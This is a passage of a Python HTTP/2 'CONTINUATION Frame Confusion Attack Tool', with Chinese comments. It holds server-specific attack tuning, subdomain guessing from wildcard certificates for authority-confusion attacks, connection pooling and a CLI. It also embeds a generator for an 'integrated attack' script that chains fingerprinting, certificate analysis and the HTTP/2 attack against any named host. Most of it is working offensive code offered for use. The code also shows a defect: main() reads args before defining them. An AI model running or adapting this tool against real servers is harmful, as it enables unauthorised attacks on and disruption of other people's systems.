                'authority': domain,
                'attack_type': 'authority_confusion',
                'confidence': 'high'
            })
        
        # Check for wildcard certificate abuse opportunities
        for wildcard in cert_insights['wildcard_certs']:
            base_domain = wildcard.replace('*.', '')
            admin_variants = [
                f'admin.{base_domain}',
                f'internal.{base_domain}',
                f'api.{base_domain}',
                f'mgmt.{base_domain}'
            ]
            
            for variant in admin_variants:
                cert_insights['enhanced_targets'].append({
                    'authority': variant,
                    'attack_type': 'subdomain_confusion',
                    'confidence': 'medium'
                })
        
        return cert_insights
    
    def integrate_external_intelligence(self) -> Dict[str, Any]:
        """Integrate all external intelligence for enhanced attacks"""
        intelligence = {
            'fingerprint': self.apply_fingerprint_intelligence(),
            'certificate': self.apply_certificate_intelligence(),
            'combined_strategy': {}
        }
        
        # Combine intelligence for coordinated attacks
        if intelligence['fingerprint'] and intelligence['certificate']:
            combined = intelligence['combined_strategy']
            
            # Prioritize attacks based on combined intelligence
            combined['high_priority_attacks'] = list(set(
                intelligence['fingerprint'].get('targeted_attacks', []) +
                [target['attack_type'] for target in intelligence['certificate'].get('enhanced_targets', [])]
            ))
            
            # Enhanced authority targets from certificate analysis
            combined['enhanced_authorities'] = [
                target['authority'] for target in intelligence['certificate'].get('enhanced_targets', [])
                if target['confidence'] == 'high'
            ]
            
            # Server-specific optimizations
            combined['optimizations'] = {
                'frame_timing': self._get_server_specific_timing(),
                'payload_sizes': self._get_server_specific_sizes(),
                'retry_strategy': self._get_server_specific_retry_strategy()
            }
        
        return intelligence
    
    def _get_server_specific_timing(self) -> Dict[str, float]:
        """Get server-specific timing optimizations"""
        server_type = self.fingerprint_data.get('server', '').lower()
        
        timings = {
            'frame_delay': 0.001,
            'continuation_delay': 0.001,
            'settings_delay': 0.005
        }
        
        if 'nginx' in server_type:
            timings['frame_delay'] = 0.0005  # Faster for nginx
        elif 'apache' in server_type:
            timings['frame_delay'] = 0.002   # Slower for apache
        elif 'cloudflare' in server_type:
            timings['frame_delay'] = 0.0001  # Very fast for CDN
        
        return timings
    
    def _get_server_specific_sizes(self) -> Dict[str, int]:
        """Get server-specific payload sizes"""
        server_type = self.fingerprint_data.get('server', '').lower()
        
        sizes = {
            'min_frame_size': 1,
            'max_frame_size': 16384,
            'optimal_chunk_size': 1000
        }
        
        if 'nginx' in server_type:
            sizes['optimal_chunk_size'] = 8192
        elif 'apache' in server_type:
            sizes['optimal_chunk_size'] = 4096
        
        return sizes
    
    def _get_server_specific_retry_strategy(self) -> Dict[str, Any]:
        """Get server-specific retry strategy"""
        return {
            'backoff_multiplier': 1.5,
            'max_backoff': 5.0,
            'connection_reuse': True
        }
    
    async def _get_pooled_connection(self) -> Tuple[asyncio.StreamReader, asyncio.StreamWriter]:
        """Get connection from pool or create new one"""
        if self.connection_pool and len(self.connection_pool) > 0:
            try:
                reader, writer = self.connection_pool.pop()
                # Verify connection is still alive
                if not writer.is_closing():
                    if self.debug:
                        logger.debug("Reusing pooled connection")
                    return reader, writer
                else:
                    if self.debug:
                        logger.debug("Pooled connection was closed, creating new one")
            except Exception:
                logger.debug("Error with pooled connection, creating new one")
        
        # Create new connection
        reader, writer = await self._establish_h2_connection()
        self.active_connections += 1
        return reader, writer
    
    async def _return_connection_to_pool(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Return connection to pool if possible"""
        if len(self.connection_pool) < self.max_pool_size and not writer.is_closing():
            self.connection_pool.append((reader, writer))
            logger.debug("Connection returned to pool")
        else:
            await self._cleanup_connection(reader, writer)
            self.active_connections -= 1
            logger.debug("Connection closed (pool full or connection closing)")
    
    def _apply_attack_optimizations(self, optimizations: Dict[str, Any]):
        """Apply server-specific attack optimizations"""
        if 'frame_timing' in optimizations:
            timing = optimizations['frame_timing']
            # Update timing for current attack session
            self.connection_state['frame_delay'] = timing.get('frame_delay', 0.001)
            self.connection_state['continuation_delay'] = timing.get('continuation_delay', 0.001)
            self.connection_state['settings_delay'] = timing.get('settings_delay', 0.005)
        
        if 'payload_sizes' in optimizations:
            sizes = optimizations['payload_sizes']
            self.connection_state['optimal_chunk_size'] = sizes.get('optimal_chunk_size', 1000)
            self.connection_state['min_frame_size'] = sizes.get('min_frame_size', 1)
        
        if 'retry_strategy' in optimizations:
            retry = optimizations['retry_strategy']
            self.connection_state['backoff_multiplier'] = retry.get('backoff_multiplier', 1.5)
    
    def _calculate_overall_risk(self, vulnerabilities: List[Dict]) -> str:
        """Calculate overall risk level"""
        if not vulnerabilities:
            return 'NONE'
        
        severity_counts = {
            'CRITICAL': sum(1 for v in vulnerabilities if v['severity'] == 'CRITICAL'),
            'HIGH': sum(1 for v in vulnerabilities if v['severity'] == 'HIGH'),
            'MEDIUM': sum(1 for v in vulnerabilities if v['severity'] == 'MEDIUM'),
            'LOW': sum(1 for v in vulnerabilities if v['severity'] == 'LOW')
        }
        
        if severity_counts['CRITICAL'] > 0:
            return 'CRITICAL'
        elif severity_counts['HIGH'] > 1:
            return 'HIGH'
        elif severity_counts['HIGH'] > 0 or severity_counts['MEDIUM'] > 2:
            return 'MEDIUM'
        else:
            return 'LOW'

# Integration Helper Functions
def create_integration_example() -> str:
    """Create example integration script for combining with other tools"""
    example_script = '''#!/usr/bin/env python3
"""
集成攻击示例脚本
结合fingerprint_proxy.py, cert_sociology.py 和 h2_cfs.py
"""

import asyncio
import json
import sys
from pathlib import Path

# 假设其他工具在同一目录下
sys.path.append(str(Path(__file__).parent))

try:
    from fingerprint_proxy import ProxyFingerprinter  # 指纹工具
    from cert_sociology import CertAnalyzer          # 证书分析工具
    from h2_cfs import H2ContinuationConfusion       # HTTP/2攻击工具
except ImportError as e:
    print(f"Import error: {e}")
    print("确保所有工具都在同一目录下")
    sys.exit(1)

async def integrated_attack(target_host: str, target_port: int = 443):
    """执行集成化攻击流程"""
    results = {
        'target': f"{target_host}:{target_port}",
        'phases': {}
    }
    
    print(f" 开始对 {target_host}:{target_port} 的集成攻击")
    
    # Phase 1: 指纹识别
    print("\\n Phase 1: 服务器指纹识别...")
    try:
        fingerprinter = ProxyFingerprinter(target_host, target_port)
        fingerprint_results = await fingerprinter.comprehensive_fingerprint()
        results['phases']['fingerprint'] = fingerprint_results
        print(f"   服务器类型: {fingerprint_results.get('server', 'Unknown')}")
        print(f"   HTTP/2支持: {fingerprint_results.get('http2_support', False)}")
    except Exception as e:
        print(f"   指纹识别失败: {e}")
        fingerprint_results = {}
    
    # Phase 2: 证书分析
    print("\\n Phase 2: 证书社会学分析...")
    try:
        cert_analyzer = CertAnalyzer(target_host, target_port)
        cert_results = await cert_analyzer.analyze_certificate_relationships()
        results['phases']['certificate'] = cert_results
        print(f"   证书域名: {len(cert_results.get('san_domains', []))}")
        print(f"   内部域名发现: {len(cert_results.get('internal_domains', []))}")
    except Exception as e:
        print(f"   证书分析失败: {e}")
        cert_results = {}
    
    # Phase 3: HTTP/2 CONTINUATION攻击
    print("\\n Phase 3: HTTP/2 CONTINUATION攻击...")
    try:
        h2_attacker = H2ContinuationConfusion(
            target_host=target_host,
            target_port=target_port,
            fingerprint_data=fingerprint_results,
            cert_data=cert_results
        )
        
        h2_results = await h2_attacker.run_all_attacks()
        results['phases']['h2_continuation'] = h2_results
        
        vuln_count = len(h2_results.get('vulnerabilities', []))
        risk_level = h2_results.get('summary', {}).get('overall_risk', 'NONE')
        print(f"   发现漏洞: {vuln_count}")
        print(f"   风险等级: {risk_level}")
        
    except Exception as e:
        print(f"   HTTP/2攻击失败: {e}")
        h2_results = {}
    
    # Phase 4: 综合分析
    print("\\n Phase 4: 综合威胁分析...")
    comprehensive_analysis = analyze_comprehensive_threats(results)
    results['comprehensive_analysis'] = comprehensive_analysis
    
    print(f"\\n 集成攻击完成!")
    print(f" 总体风险评级: {comprehensive_analysis.get('overall_threat_level', 'UNKNOWN')}")
    
    return results

def analyze_comprehensive_threats(attack_results: dict) -> dict:
    """综合分析所有攻击结果"""
    analysis = {
        'threat_vectors': [],
        'attack_chains': [],
        'overall_threat_level': 'LOW'
    }
    
    fingerprint = attack_results['phases'].get('fingerprint', {})
    cert = attack_results['phases'].get('certificate', {})
    h2 = attack_results['phases'].get('h2_continuation', {})
    
    # 分析攻击链组合
    if fingerprint.get('http2_support') and h2.get('vulnerabilities'):
        for vuln in h2['vulnerabilities']:
            if vuln['severity'] in ['CRITICAL', 'HIGH']:
                analysis['threat_vectors'].append({
                    'type': 'http2_continuation_exploit',
                    'severity': vuln['severity'],
                    'description': vuln['title']
                })
    
    # 证书+HTTP/2组合攻击
    if cert.get('internal_domains') and h2.get('vulnerabilities'):
        authority_vulns = [v for v in h2['vulnerabilities'] if 'authority' in v['type']]
        if authority_vulns:
            analysis['attack_chains'].append({
                'name': 'Certificate-Enhanced Authority Confusion',
                'description': '利用证书中的内部域名进行HTTP/2权限混淆攻击',
                'impact': 'CRITICAL',
                'feasibility': 'HIGH'
            })
    
    # 计算综合威胁等级
    if analysis['attack_chains']:
        analysis['overall_threat_level'] = 'CRITICAL'
    elif analysis['threat_vectors']:
        max_severity = max([tv['severity'] for tv in analysis['threat_vectors']])
        analysis['overall_threat_level'] = max_severity
    
    return analysis

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python integrated_attack.py <target_host> [port]")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
    
    # Windows事件循环兼容性
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    
    results = asyncio.run(integrated_attack(target, port))
    
    # 输出结果
    with open(f"integrated_attack_{target.replace('.', '_')}.json", 'w') as f:
        json.dump(results, f, indent=2, default=str)
    
    print(f"\\n 详细结果已保存到: integrated_attack_{target.replace('.', '_')}.json")
'''
    return example_script

# CLI Interface and Utilities
def format_results_as_json(results: Dict[str, Any]) -> str:
    """Format results as pretty-printed JSON"""
    return json.dumps(results, indent=2, ensure_ascii=False, default=str)

def format_results_as_report(results: Dict[str, Any]) -> str:
    """Format results as human-readable report"""
    report = []
    report.append("="*80)
    report.append("HTTP/2 CONTINUATION FRAME CONFUSION ATTACK REPORT")
    report.append("="*80)
    
    report.append(f"\nTarget: {results.get('target')}")
    report.append(f"Timestamp: {results.get('timestamp')}")
    report.append(f"Duration: {results.get('metadata', {}).get('attack_duration', 0):.2f}s")
    
    summary = results.get('summary', {})
    report.append(f"\n SUMMARY:")
    report.append(f"   Total Attacks: {summary.get('total_attacks', 0)}")
    report.append(f"   Vulnerabilities Found: {summary.get('vulnerabilities_found', 0)}")
    report.append(f"   Overall Risk: {summary.get('overall_risk', 'UNKNOWN')}")
    
    if results.get('vulnerabilities'):
        report.append(f"\n VULNERABILITIES:")
        for i, vuln in enumerate(results['vulnerabilities'], 1):
            report.append(f"\n   {i}. [{vuln['severity']}] {vuln['title']}")
            report.append(f"      Impact: {vuln['impact']}")
            if vuln.get('evidence'):
                report.append(f"      Evidence: {', '.join(vuln['evidence'][:3])}")
    else:
        report.append(f"\n No vulnerabilities detected - target appears secure")
    
    return '\n'.join(report)

async def main():
    """Enhanced main function with comprehensive CLI"""
    import argparse
    
    # Enhanced Windows兼容性修复
    if sys.platform == 'win32':
        # 使用SelectorEventLoop for better compatibility
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
        # 设置Windows特有的资源限制
        if RESOURCE_AVAILABLE:
            try:
                # 增加文件描述符限制 (仅在支持的系统上)
                soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
                resource.setrlimit(resource.RLIMIT_NOFILE, (min(hard, 4096), hard))
                if args.verbose:
                    logger.info(f"Set file descriptor limit: {min(hard, 4096)}")
            except (AttributeError, OSError):
                if args.verbose:
                    logger.debug("Resource limits not available on this platform")
        
        # Windows特定的优化设置
        try:
            # 设置更大的缓冲区大小
            socket.setdefaulttimeout(30.0)
            logger.debug("Applied Windows-specific socket optimizations")
        except Exception:
            pass
    
    parser = argparse.ArgumentParser(
        description='HTTP/2 CONTINUATION Frame Confusion Attack Tool v2.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s example.com
  %(prog)s api.example.com --port 8443 --timeout 15
  %(prog)s target.com --output report.json --format json
  %(prog)s internal.service --verbose --max-retries 5
  %(prog)s target.com --integrated-mode --fingerprint-file fingerprint.json --cert-file cert.json
  %(prog)s example.com --memory-limit 1024 --attacks pseudo_header_priority authority_confusion
        """
    )
    
    parser.add_argument('host', nargs='?', help='Target hostname or IP address')
    parser.add_argument('--fallback-http1', action='store_true', 
                       help='Perform basic HTTP/1.1 reconnaissance when HTTP/2 is not supported')
    parser.add_argument('--port', type=int, default=443, help='Target port (default: 443)')
    parser.add_argument('--timeout', type=float, default=10.0, help='Connection timeout in seconds (default: 10)')
    parser.add_argument('--max-retries', type=int, default=3, help='Maximum retry attempts per attack (default: 3)')
    parser.add_argument('--output', '-o', help='Output file path')
    parser.add_argument('--format', choices=['json', 'report'], default='report', help='Output format (default: report)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose logging')
    parser.add_argument('--attacks', nargs='+', help='Specific attacks to run (default: all)')
    parser.add_argument('--memory-limit', type=int, default=512, help='Memory limit in MB (default: 512)')
    parser.add_argument('--fingerprint-file', help='Path to fingerprint_proxy.py results JSON file')
    parser.add_argument('--cert-file', help='Path to cert_sociology.py results JSON file')
    parser.add_argument('--integrated-mode', action='store_true', help='Enable integrated attack mode with external intelligence')
    parser.add_argument('--generate-integration-script', action='store_true', help='Generate integration example script and exit')
    
    args = parser.parse_args()
    
    # Handle integration script generation
    if args.generate_integration_script:
        script_content = create_integration_example()
        script_filename = 'integrated_attack_example.py'
        
        with open(script_filename, 'w', encoding='utf-8') as f:
            f.write(script_content)
        
        print(f" 集成攻击示例脚本已生成: {script_filename}")
        print(f" 使用方法: python {script_filename} <target_host> [port]")
        print(f" 该脚本展示了如何将h2_cfs.py与你的其他工具集成使用")
        print(f" 集成功能包括:")
        print(f"   - fingerprint_proxy.py 指纹识别结果集成")
        print(f"   - cert_sociology.py 证书分析结果集成")
        print(f"   - 智能攻击优先级排序")
        print(f"   - 服务器特定的优化策略")
        return 0
    
    # Check if host is provided for attack mode
    if not args.host:
        parser.error("Target host is required unless using --generate-integration-script")
    
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    
    print(f" HTTP/2 CONTINUATION Frame Confusion Attack Tool v2.0")
    print(f" Target: {args.host}:{args.port}")
    print(f" Configuration: timeout={args.timeout}s, retries={args.max_retries}, memory_limit={args.memory_limit}MB")
    
    # Load external intelligence data if provided
    fingerprint_data = None
    cert_data = None
    
    if args.fingerprint_file:
        try:
            with open(args.fingerprint_file, 'r', encoding='utf-8') as f:
                fingerprint_data = json.load(f)
            print(f" Loaded fingerprint data from: {args.fingerprint_file}")
        except Exception as e:
            logger.warning(f"Failed to load fingerprint data: {e}")
    
    if args.cert_file:
        try:
            with open(args.cert_file, 'r', encoding='utf-8') as f:
                cert_data = json.load(f)
            print(f" Loaded certificate data from: {args.cert_file}")
        except Exception as e:
            logger.warning(f"Failed to load certificate data: {e}")
    
    if args.integrated_mode and (fingerprint_data or cert_data):
        print(f" Integrated mode enabled with external intelligence")
    
    print(f" Starting comprehensive HTTP/2 vulnerability assessment...")
    print()
    
    # Create and run attacker with intelligence integration
    attacker = H2ContinuationConfusion(
        target_host=args.host,
        target_port=args.port,
        timeout=args.timeout,
        max_retries=args.max_retries,
        memory_limit_mb=args.memory_limit,
        fingerprint_data=fingerprint_data,
        cert_data=cert_data,
        debug=args.verbose  # Use verbose flag for debug mode
    )
    
    try:
        results = await attacker.run_all_attacks()
        
        # Check for fallback HTTP/1.1 reconnaissance if HTTP/2 failed and fallback flag is set
        if not results.get('connectivity', {}).get('supported', True) and args.fallback_http1:
            print(f"\n ATTEMPTING HTTP/1.1 FALLBACK RECONNAISSANCE:")
            try:
                fallback_results = await attacker.perform_http1_reconnaissance()
                results['http1_fallback'] = fallback_results
                
                print(f"    Basic connectivity: {' Success' if fallback_results.get('success') else ' Failed'}")
                if fallback_results.get('server_header'):
                    print(f"     Server: {fallback_results['server_header']}")
                if fallback_results.get('response_headers'):
                    security_headers = ['strict-transport-security', 'content-security-policy', 'x-frame-options']
                    found_security = [h for h in security_headers if h in fallback_results['response_headers']]
                    print(f"    Security headers found: {len(found_security)}")
                    
            except Exception as e:
                print(f"    HTTP/1.1 reconnaissance failed: {e}")
        
        # Format output
        if args.format == 'json':
            output = format_results_as_json(results)
        else:
            output = format_results_as_report(results)
        
        # Write to file or stdout
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                f.write(output)
            print(f" Results written to: {args.output}")
        else:
            print(output)
        
        # Exit with appropriate code
        severity_to_exit_code = {
            'CRITICAL': 4,
            'HIGH': 3,
            'MEDIUM': 2,
            'LOW': 1,
            'NONE': 0
        }
        
        exit_code = severity_to_exit_code.get(
            results.get('summary', {}).get('overall_risk', 'NONE'), 0
        )
        
        return exit_code
        
    except KeyboardInterrupt:
        print("\n️  Attack interrupted by user")
        return 130
    except Exception as e:
        print(f" Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1

if __name__ == "__main__":
    exit_code = asyncio.run(main())
    sys.exit(exit_code)
